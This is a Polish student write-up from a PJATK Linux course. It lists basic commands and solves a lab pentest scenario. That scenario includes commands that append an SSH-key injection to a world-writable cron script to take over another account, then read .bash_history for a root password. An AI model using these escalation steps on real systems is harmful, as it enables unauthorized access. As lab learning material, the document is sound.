# 🧠 Writeup: Podstawy Systemu Linux - what I learnt

## 📌 Informacje ogólne
- Platforma: CyberHack by PJATK 
- Kategoria: Nauka
- Program: VMware Fusion na Mac OS / Kali Linux
- Autor: SonnyMat - wykonanie zadań / Program - Polsko Japońska Akademia Technik Komputeorwych 

---

Write-up: Podstawy Systemu Linux & Scenariusz Pentestowy
1. Czego się nauczyłam?
Podczas tych zajęć poznałam fundamenty pracy z systemem Linux (ze szczególnym uwzględnieniem dystrybucji Kali Linux), które są niezbędne w pracy administratora i pentestera. Kluczowe obszary to:

- **Zarządzanie połączeniami zdalnymi:** Bezpieczne logowanie przez SSH z wykorzystaniem haseł oraz kluczy publicznych/prywatnych.  
- **Poruszanie się w terminalu:** Efektywne korzystanie ze skrótów klawiszowych i historii komend.  
- **Struktura systemu:** Zrozumienie hierarchii katalogów (np. `/etc` dla konfiguracji, `/bin` dla plików wykonywalnych).  
- **Diagnostyka systemu i sieci:** Sprawdzanie zasobów sprzętowych (CPU, RAM, dyski) oraz aktywnych połączeń sieciowych.  
- **Automatyzacja i usługi:** Zarządzanie procesami w tle (`systemd`) oraz zadaniami harmonogramu (`cron`).  
- **Eskalacja uprawnień:** Praktyczne wykorzystanie błędnej konfiguracji uprawnień plików do przejęcia konta innego użytkownika. 

--------------------------------------------------------------------------------
2. Komendy i ich znaczenie
   
Uzytkownik:

## 🐧 Linux – Umiejętności praktyczne

### 👤 Użytkownicy i środowisko systemowe
- `whoami`, `echo $USER` – weryfikacja kontekstu użytkownika
- `id` – analiza UID, GID oraz przynależności do grup (kontrola uprawnień)
- `env` – analiza zmiennych środowiskowych (debugowanie, konfiguracja aplikacji, Docker)

---

### 🖥 Diagnostyka systemu i zasobów
- `uname -a` – identyfikacja jądra i architektury systemu
- `/proc/cpuinfo`, `/proc/meminfo` – analiza parametrów CPU i RAM
- `lsblk`, `df -h` – zarządzanie i monitorowanie przestrzeni dyskowej
- `free -h` – monitorowanie wykorzystania pamięci
- `top` – analiza procesów i obciążenia systemu
- `lspci`, `lsusb` – identyfikacja urządzeń sprzętowych

---

### 📁 Zarządzanie plikami i systemem plików
- `ls -la` – analiza uprawnień i struktury katalogów
- `cp`, `mv`, `rm`, `touch` – operacje na plikach
- `find`, `grep` – wyszukiwanie plików i treści w systemie
- Praca z przekierowaniami błędów (`2>/dev/null`)

---

### 🌐 Sieć i zdalny dostęp
- `ssh`, `ssh-keygen` – konfiguracja i obsługa dostępu SSH (klucze publiczne/prywatne)
- `ip a` – analiza konfiguracji interfejsów sieciowych
- `ss -tlp` – diagnostyka portów i usług nasłuchujących
- `/etc/resolv.conf` – weryfikacja konfiguracji DNS

---

### 📦 Zarządzanie pakietami (Debian/Ubuntu)
- `apt update`, `apt upgrade` – aktualizacja systemu
- `apt autoremove` – utrzymanie czystości zależności

--------------------------------------------------------------------------------
3. Rozwiązanie Scenariusza Pentestowego (Write-up):

Cel: Odczytanie flagi z pliku /root/root.txt na maszynie PENTEST (192.168.***.**).

Krok 1: Dostęp początkowy

Maszyna PENTEST jest dostępna tylko z poziomu maszyny pośredniczącej. Najpierw loguję się na maszynę ćwiczeniową, a z niej (wykorzystując klucz publiczny) na docelowy serwer jako użytkownik pentest:
ssh stu*****@192.168.***.*  #
ssh pen*****@192.168.***.** # Logowanie bezhasłowe

Krok 2: Rekonesans i znalezienie podatności

Przeszukuję system pod kątem błędnych konfiguracji. Sprawdzam harmonogram zadań Cron:

cat /etc/crontab

Znajduję wpis: * * * * * developer /home/developer/clean.sh. Oznacza to, że skrypt clean.sh jest uruchamiany co minutę z uprawnieniami użytkownika developer. Sprawdzam uprawnienia tego skryptu:

ls -l /home/developer/clean.sh
Plik ma uprawnienia rwxrwxrwx (world-writable), co pozwala każdemu użytkownikowi na jego edycję.

Krok 3: Eskalacja do użytkownika developer

Wykorzystuję skrypt Cron, aby dodać swój klucz SSH do autoryzowanych kluczy użytkownika developer:

echo "mkdir -p /home/developer/.ssh" >> /home/developer/clean.sh
echo "echo $(cat /home/pentest/.ssh/authorized_keys) > /home/developer/.ssh/authorized_keys" >> /home/developer/clean.sh

Po minucie loguję się jako developer:
ssh de****@192.168.***.**

Krok 4: Przejęcie uprawnień roota

Analizuję historię komend użytkownika developer w poszukiwaniu wrażliwych danych:
cat /home/developer/.bash_history
W historii odnajduję hasło do konta root. Używam komendy su, aby podnieść uprawnienia:
su  # Wpisuję znalezione hasło

Krok 5: Finalizacja

Jako użytkownik root odczytuję flagę końcową:
cat /root/root.txt

WAŻNE: **nie zawsze będzie podpwiedź jaki skrypt jest uruchamiany, trzeba sprawdzić na komendzie ls -la /etc/crontab cała listę i sprawdzić uprawnienia, najlepiej jak jest 777 (wszyscy mają odczyt), ale również 666, przy którym można nadpisywać i zmieniać uprawnienia poprzez komendę chmod.**


Terminal i podstawowe komendy

Jakich komend się nauczyłam i jakie sa ich funkcje: 

pwd      # pokazuje aktualny katalog
ls       # lista plików
cd       # zmiana katalogu
mkdir    # tworzenie katalogu
rmdir    # usuwanie katalogu
touch    # tworzenie pliku
rm       # usuwanie pliku
cp       # kopiowanie
mv       # przenoszenie / zmiana nazwy
cat      # wyświetlanie pliku
nano     # edytor tekstu
sudo     # uprawnienia administratora

Zarządzanie systemem
użytkownicy i uprawnienia,
procesy,
podstawy bezpieczeństwa.

---

## 🎯 Po ukończeniu materiału rozumiem: 
- czym jest Linux i gdzie się go używa,
- potrafię poruszać się po systemie plików,
- znam podstawowe komendy terminala,
- umiem zarządzać plikami i katalogami,
- rozumiem różnice między Linuxem a innymi systemami operacyjnymi.
- jak można zmienić uprawnienia poprzez Crontab 

---
## 🧰 Narzędzia
Terminal (bash)
Edytor tekstu (nano / vim)
Menedżer plików
GitHub (do dokumentacji)

---

🏁 Głównym celem pracy jest:
✅ zdobycie praktycznych umiejętności pracy w Linuxie
✅ poznanie podstawowych komend i struktury systemu
✅ przygotowanie dokumentacji (write-up) z wykonanych zadań
✅ udokumentowanie pracy za pomocą screenshotów


